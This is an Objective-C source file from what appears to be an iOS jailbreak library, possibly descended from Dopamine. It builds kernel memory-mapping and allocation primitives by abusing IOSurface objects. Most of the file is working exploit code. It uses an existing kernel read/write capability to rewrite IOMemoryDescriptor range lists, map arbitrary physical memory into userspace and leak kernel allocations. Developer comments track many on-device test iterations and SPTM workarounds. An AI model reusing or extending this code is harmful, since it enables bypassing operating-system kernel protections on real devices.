#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <errno.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
	uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
	return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
	return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
	if (gPrimitives.krwMinSafeReadSize > 0x8) {
		uint32_t zoneSize = 0x30;
		uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

		uint8_t buf[gPrimitives.krwMinSafeReadSize];
		kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
		return UNSIGN_PTR(*(uint64_t *)(&buf[0x18 - readOffset]));
	} else {
		return kread_ptr(surfaceSendRight + 0x18);
	}
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, ranges));
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
	kwrite64(surface + koffsetof(IOSurface, ranges), ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, memoryDescriptor));
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
	return kread_ptr(memoryDescriptor + 0x60);
}

uint64_t IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
{
	return kwrite64(memoryDescriptor + 0x60, ranges);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
	return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
	kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
	kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
	return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
	kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
	kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, rangeCount));
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
	kwrite32(surface + koffsetof(IOSurface, rangeCount), rangeCount);
}

uint64_t IOSurface_port_getSendRight(mach_port_t surfaceMachPort)
{
	uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
	if (koffsetof(IOMachPort, object)) {
		if (gPrimitives.krwMinSafeReadSize > 0x8) {
			uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8; // object is the last field in IOMachPort
			uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

			uint8_t buf[gPrimitives.krwMinSafeReadSize];
			kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
			surfaceSendRight = UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
		} else {
			surfaceSendRight = kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
		}
	}
	return surfaceSendRight;
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic, uint32_t cacheMode)
{
	IOSurfaceRef surfaceRef = NULL;
	if (cacheMode != 0) {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
			(__bridge NSString *)kIOSurfaceCacheMode : @(cacheMode),
		});
	} else {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
		});
	}

	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	*((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
	IOSurfaceDecrementUseCount(surfaceRef);
	CFRelease(surfaceRef);
	return port;
}

struct IOSurface_toCleanup {
	uint64_t descriptor;
	uint64_t origRanges;
	uint64_t *fakeRangesUA;
};

// v84: single-active L2 redirect state (kmap PTE-retarget path)
static uint64_t g_l2_addr   = 0;
static uint64_t g_l2_orig   = 0;
static int      g_l2_active = 0;
extern void jb_tr_beacon(const char *fmt, ...);

// v87: census carve-out map (fed by a18_probe after census-done). The
// L2 table PA is checked against these BEFORE any primitive access —
// v86 panicked because the pool's L2 table page sat in a hole on that
// boot (kernel TTBR1 has no alias for hole pages).
static struct { uint64_t lo, hi; } g_holes[16];
static int g_hole_n = 0;
void IOSurface_set_hole_run(uint64_t basePA, uint64_t pages)
{
	if (g_hole_n < 16) {
		g_holes[g_hole_n].lo = basePA;
		g_holes[g_hole_n].hi = basePA + pages * 0x4000ULL;
		g_hole_n++;
	}
}
static int pa_in_hole(uint64_t pa)
{
	for (int i = 0; i < g_hole_n; i++)
		if (pa >= g_holes[i].lo && pa < g_holes[i].hi) return 1;
	return 0;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below
static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size); // v94 fwd: defined below

struct IOSurface_toCleanup *cleanups = NULL;
unsigned cleanupsCount = 0;

// v84: restore hook — runs at kmap() ENTRY (before any new redirect) and
// on kernel-panic path teardown (fwscan flush/reboot), making the redirect
// self-healing: the L2 entry survives only while the exploit wants it.
void IOSurface_l2_restore(void)
{
	if (g_l2_active) {
		kwrite64(g_l2_addr, g_l2_orig);
		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
		g_l2_active = 0;
	}
}

int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
{
	// v73: step-by-step beacons — kmap-fail at fwscan time was instant and
	// uniform across all 8 census windows; this names the failing step.
	// No control-flow changes: only observations (plus a NULL-port guard
	// that only matters in the already-failing case).
	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
	// v81: PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
	// maps (C,first=0x539,0 = own surface ID in all 20 windows). So: take
	// the surface's own valid 64KB mapping and rewrite its L3 PTEs to the
	// target PA. No descriptor/surface writes at all — teardown-safe.
	static unsigned g_kmap_seq = 0;
	unsigned seq = g_kmap_seq++;
	jb_tr_beacon("KMAP win=%u", seq);
	// v94 FRESH-SURFACE COLD-MAP (§64: base1==base0 in 16/16 windows on
	// the WARM port-1337 client despite VERIFIED descriptor retargets ⇒
	// the cached mapping lives in the per-task IOSurfaceClient). Bypass:
	// a NEW surface per window — its client is COLD, so the FIRST
	// GetBaseAddress must build the mapping from the surface's own
	// (weaponized) range list. Every write = ordinary data-page heap via
	// alias/primitive (the only SPTM-surviving store class, proven ×5).
	// Zero PT writes. One hypothesis per launch (v94b fallback: client
	// walk via the sr0/sr8/sr30 dump).
	(void)cacheMode;
	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(0x4000);
	if (!surfaceMachPort) {
		jb_tr_beacon("KMAP fail,noport");
		*uaddr = NULL;
		return -1;
	}
	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
	jb_tr_beacon("KMAP fresh,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
	             (unsigned long long)surfaceSendRight,
	             (unsigned long long)surface,
	             (unsigned long long)desc, (unsigned long long)ranges);
	if (!desc || !ranges) {
		jb_tr_beacon("KMAP fail,freshfields");
		*uaddr = NULL;
		return -1;
	}

	// v93→v94 ARC NOTE (history): v93's KERNEL-MAPPED RETARGET proved on
	// device that desc size/ranges/memRef retargets LAND but the warm
	// client still serves the cached mapping (base1==base0 ×16, §64) —
	// the cache lives in the per-task IOSurfaceClient. v94 therefore
	// creates a FRESH surface per window (cold client) and weapons its
	// own range list before the first GetBaseAddress. History above
	// (v84/v93 comments) kept for the decode record.
	// v94: the fresh surface OWNS a 16KB/1024-entry ranges array (that's
	// how _getSurfacePort_16up builds it — no separate donor alloc needed;
	// v93's donor runs proved this array + alias write class on device).
	// Weaponize: overwrite the first entries with the TARGET PA ranges.
	// - range list: 4 entries {pa+n*0x4000, 0x4000} covering the full
	//   0x10000 probe scan, written through the array ALIAS (data-page
	//   heap, SPTM-legal, proven ×3 runs).
	// - desc.size@0x50 = 0x10000 (v75-proven landing class; fresh surface
	//   already reports a sane size — this makes it exactly the scan size)
	//   via one 32B desc window W[0x48,0x68) that also re-asserts
	//   ranges@0x60 = its own array (paranoia readback).
	uint64_t arrAlias = phystokv(kvtophys(ranges));
	if (!arrAlias) {
		jb_tr_beacon("KMAP fail,arralias");
		*uaddr = NULL;
		return -1;
	}
	uint64_t arrOff = ranges & 0x3FFFULL;
	if (arrOff + 4 * 0x10 > 0x4000) {
		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx", (unsigned long long)arrOff);
		*uaddr = NULL;
		return -1;
	}
	for (int ei = 0; ei < 4; ei++) {
		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, pa + ei * 0x4000ULL);
		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x8, 0x4000ULL);
	}
	jb_tr_beacon("KMAP ranges4,pa=%llx,e0=%llx,%llx",
	             (unsigned long long)pa,
	             (unsigned long long)kread64(arrAlias + arrOff),
	             (unsigned long long)kread64(arrAlias + arrOff + 8));

	// desc.size retarget via W[0x48,0x68) (v93-proven window/offsets).
	uint8_t winA[0x20];
	if (kreadbuf(desc + 0x48, winA, sizeof(winA)) != 0) {
		jb_tr_beacon("KMAP fail,readA,desc=%llx", (unsigned long long)desc);
		*uaddr = NULL;
		return -1;
	}
	*(uint64_t *)(winA + (0x50 - 0x48)) = 0x10000ULL;   // size = scan size
	*(uint64_t *)(winA + (0x60 - 0x48)) = ranges;       // re-assert own array
	if (kwritebuf(desc + 0x48, winA, sizeof(winA)) != 0) {
		jb_tr_beacon("KMAP fail,writeA,desc=%llx", (unsigned long long)desc);
		*uaddr = NULL;
		return -1;
	}
	jb_tr_beacon("KMAP desc,rb,r50=%llx,r60=%llx",
	             (unsigned long long)kread64(desc + 0x50),
	             (unsigned long long)kread64(desc + 0x60));

	// Send-right kobject field dump (v94b fallback feed, carried over).
	jb_tr_beacon("KMAP sr0=%llx,sr8=%llx,sr30=%llx",
	             (unsigned long long)kread64(surfaceSendRight + 0x0),
	             (unsigned long long)kread64(surfaceSendRight + 0x8),
	             (unsigned long long)kread64(surfaceSendRight + 0x30));

	// THE KERNEL DOES THE MAPPING: first lookup + GetBaseAddress on the
	// COLD client — it must build the mapping from our weaponized range
	// list. No warm cache exists to serve.
	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
	int lookupB = (refB != NULL);
	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
	jb_tr_beacon("KMAP B,lookup=%d,base1=%llx",
	             lookupB,
	             (unsigned long long)(uintptr_t)base1);
	if (!lookupB || !base1) {
		jb_tr_beacon("KMAP fail,base1");
		*uaddr = NULL;
		return -1;
	}
	// Content discriminator through the kernel-built mapping: target
	// window content ⇒ COLD-MAP CONFIRMED = THE PROBE WINDOW = CHAIN
	// GATE. 539,0-style own-ID pattern ⇒ client cache pre-populated from
	// elsewhere (v94b). Repeated qword pattern ⇒ unmapped garbage.
	jb_tr_beacon("KMAP C,first=%llx,%llx",
	             (unsigned long long)*(volatile uint64_t *)base1,
	             (unsigned long long)((volatile uint64_t *)base1)[1]);
	*uaddr = base1;
	return 0;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr) {
	return IOSurface_map_withCacheMode(pa, size, uaddr, 0);
}

void IOSurface_map_cleanup(void)
{
	IOSurface_l2_restore(); // v84: never leave the L2 redirect dangling

	if (cleanupsCount == 0) return;

	for (unsigned i = 0; i < cleanupsCount; i++) {
		uint64_t desc = cleanups[i].descriptor;
		uint64_t origRanges = cleanups[i].origRanges;
		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;

		IOMemoryDescriptor_set_ranges(desc, origRanges);
		free(fakeRangesUA);
	}

	free(cleanups);
	cleanups = NULL;
	cleanupsCount = 0;
}

static CFNumberRef CFNUM64(uint64_t value) {
    return CFNumberCreate(NULL, kCFNumberSInt64Type, (void *)&value);
}

static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);

	static vm_size_t dummyPageSize = 0x4000;
	static vm_address_t dummyPage = 0;
	if (dummyPage == 0) {
		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
	}

	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
		userspaceRanges[i] = dummyPage;
		userspaceRanges[i+1] = dummyPageSize;
	}

    CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
    free(userspaceRanges);

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
	CFNumberRef dummyPageSizeNum = CFNUM64(dummyPageSize);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"),     (const void *)dummyPageSizeNum);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);

    IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);

	CFRelease(userspaceRangesData);
	CFRelease(dummyPageSizeNum);
	CFRelease(dict);

    return port;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
{
	if (size > 0x10000) return -1; // 0x10000 is max

	// v89 RMW-law fix, second pass (v88 run 13:32:35): runtime offsets are
	// ranges=0x360, rangeCount=0x3a4 (§49/§50 ground truth) — 0x44 apart, so
	// ONE 32B window can never cover both (v88's fail,offsets guard proved
	// it live, 32 beacons, no panic). Two windows, each fully inside the
	// 960B object (end 0x3c0):
	//   W_R [0x360,0x380)  ranges @ win+0
	//   W_C [0x388,0x3a8)  rangeCount @ win+0x1c (field end == window end)
	// Field reads extract from the window buffer; leak=true detaches the
	// array (original Dopamine semantics: kernel forgets it without freeing
	// → nothing can ever rewrite our fake L3) via RMW-style window writes
	// that preserve neighbors BY CONTENT.
	uint32_t offRanges   = koffsetof(IOSurface, ranges);
	uint32_t offRangeCnt = koffsetof(IOSurface, rangeCount);
	if (offRanges > 960 - 0x20 || (offRanges % 8) != 0) {
		jb_tr_beacon("KALLOC16UP fail,winR,ranges=%x", offRanges);
		return 0;
	}
	if (offRangeCnt < offRanges + 0x20 || offRangeCnt > 960 - 0x4) {
		jb_tr_beacon("KALLOC16UP fail,winC,cnt=%x", offRangeCnt);
		return 0;
	}
	uint32_t offWinC     = offRangeCnt - 0x1c;           // 0x3a4-0x1c = 0x388
	uint32_t cntOffInWin = offRangeCnt - offWinC;        // 0x1c
	if ((offRangeCnt + 0x4) > (offWinC + 0x20)) {        // field inside W_C
		jb_tr_beacon("KALLOC16UP fail,winCspan,cnt=%x", offRangeCnt);
		return 0;
	}

	while (true) {
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);

		uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);

		// W_R: ranges qword (window [0x360,0x380) — v80-proven safe).
		uint8_t winR[0x20];
		if (kreadbuf(surface + offRanges, winR, sizeof(winR)) != 0) {
			jb_tr_beacon("KALLOC16UP fail,readR,surface=%llx", (unsigned long long)surface);
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}
		uint64_t va = UNSIGN_PTR(*(uint64_t *)(winR + 0));

		// W_C: rangeCount dword (window [0x388,0x3a8) ⊆ object).
		uint8_t winC[0x20];
		if (kreadbuf(surface + offWinC, winC, sizeof(winC)) != 0) {
			jb_tr_beacon("KALLOC16UP fail,readC,surface=%llx", (unsigned long long)surface);
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}
		uint64_t vaSize = (uint64_t)(*(uint32_t *)(winC + cntOffInWin)) * 0x10;

		if (vaSize < size) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (leak) {
			// Detach: ranges=0 via W_R RMW (preserve 0x368..0x380),
			// rangeCount=0 via W_C RMW (preserve 0x388..0x3a4).
			*(uint64_t *)(winR + 0) = 0;
			if (kwritebuf(surface + offRanges, winR, sizeof(winR)) != 0) {
				jb_tr_beacon("KALLOC16UP fail,writeR,surface=%llx", (unsigned long long)surface);
				mach_port_deallocate(mach_task_self(), surfaceMachPort);
				continue;
			}
			*(uint32_t *)(winC + cntOffInWin) = 0;
			if (kwritebuf(surface + offWinC, winC, sizeof(winC)) != 0) {
				jb_tr_beacon("KALLOC16UP fail,writeC,surface=%llx", (unsigned long long)surface);
				mach_port_deallocate(mach_task_self(), surfaceMachPort);
				continue;
			}
		}
		// leak=false: array stays attached — freed with the surface; caller
		// must finish before teardown (original semantics, unchanged).
		// Success path intentionally never deallocates the port send right
		// (original Dopamine behavior — the surface outlives the call).

		jb_tr_beacon("KALLOC16UP ok,va=%llx,size=%llx,leak=%d",
		             (unsigned long long)va, (unsigned long long)vaSize, leak ? 1 : 0);
		return va;
	}

	return 0;
}

static mach_port_t IOSurface_kalloc_getSurfacePort_15(uint64_t size)
{
	uint64_t allocSize = 0x10;
	uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
	memset(addressRangesBuf, 0, size);
	addressRangesBuf[0] = (uint64_t)malloc(allocSize);
	addressRangesBuf[1] = allocSize;
	NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
	free(addressRangesBuf);

	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAllocSize" : @(allocSize),
		@"IOSurfaceAddressRanges" : addressRanges,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	IOSurfaceDecrementUseCount(surfaceRef);
	return port;
}

uint64_t IOSurface_kalloc_15(uint64_t size, bool leak)
{
	while (true) {
		uint64_t allocSize = max(size, 0x10000);
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_15(allocSize);

		uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);

		if (kvtophys(va + allocSize) != 0) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (va == 0) continue;

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va + (allocSize - size);
	}

	return 0;
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, true);
	}
	else {
		alloc = IOSurface_kalloc_15(size, true);
	}

	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, false);
	}
	else {
		alloc = IOSurface_kalloc_15(size, false);
	}
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

void libjailbreak_IOSurface_primitives_init(void)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	if (!surfaceRef) {
		char execPath[PATH_MAX];
		uint32_t execPathSize = PATH_MAX;
		_NSGetExecutablePath(execPath, &execPathSize);
		printf("Failed to initialize IOSurface primitives, add \"IOSurfaceRootUserClient\" to the \"com.apple.security.exception.iokit-user-client-class\" dictionary of the entitlements from \"%s\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\n", execPath);
		return;
	}
	CFRelease(surfaceRef);

	gPrimitives.kmap = IOSurface_map;
	gPrimitives.kalloc_global = IOSurface_kalloc_global;
	gPrimitives.kalloc_local  = IOSurface_kalloc_local;
}